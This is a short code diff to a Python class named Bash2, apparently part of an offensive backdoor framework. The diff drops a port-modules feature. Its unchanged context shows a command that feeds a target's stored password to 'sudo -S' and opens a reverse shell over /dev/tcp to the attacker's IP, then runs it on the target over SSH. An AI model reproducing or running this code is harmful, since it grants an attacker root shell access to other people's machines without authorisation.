@@ -12,11 +12,7 @@ class Bash2(Backdoor):
                 }
         self.allow_modules = True
         self.modules = {} 
-	self.portModules = {}
     
-    def get_port(self):
-        return self.get_value("port")
-
     def get_command(self):
         return "echo " + self.core.curtarget.pword + " | sudo -S nohup 0<&196;exec 196<>/dev/tcp/" + self.core.localIP + "/%s; sh <&196 >&196 2>&196" % self.get_value("port")
     
@@ -28,8 +24,4 @@ class Bash2(Backdoor):
         target.ssh.exec_command(self.get_command())
         for mod in self.modules.keys():
             print(INFO + "Attempting to execute " + mod.name + " module...")
-            mod.exploit(self.get_command())
-	for mod in self.portModules.keys():
-	    print(INFO + "Attempting to execute " + mod.name + " module...")
-            mod.exploit(self.get_port())
-
+            mod.exploit()
